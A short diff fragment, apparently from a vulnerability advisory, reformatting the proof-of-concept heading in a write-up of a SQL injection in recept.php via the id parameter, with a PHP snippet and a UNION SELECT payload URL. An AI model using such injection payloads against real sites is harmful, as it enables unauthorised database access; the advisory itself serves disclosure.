@@ -16,5 +16,6 @@ in recept.php line 41 allows SQL Injection via the id parameter
 	?>
 	<p><img src="images/<?php echo "$id" ?>.jpg" alt = "рецепт"><?php echo "$zag"?></p>
   
-POC:
+##POC:##
+
 http://target/recept.php?id=-1 union select user()
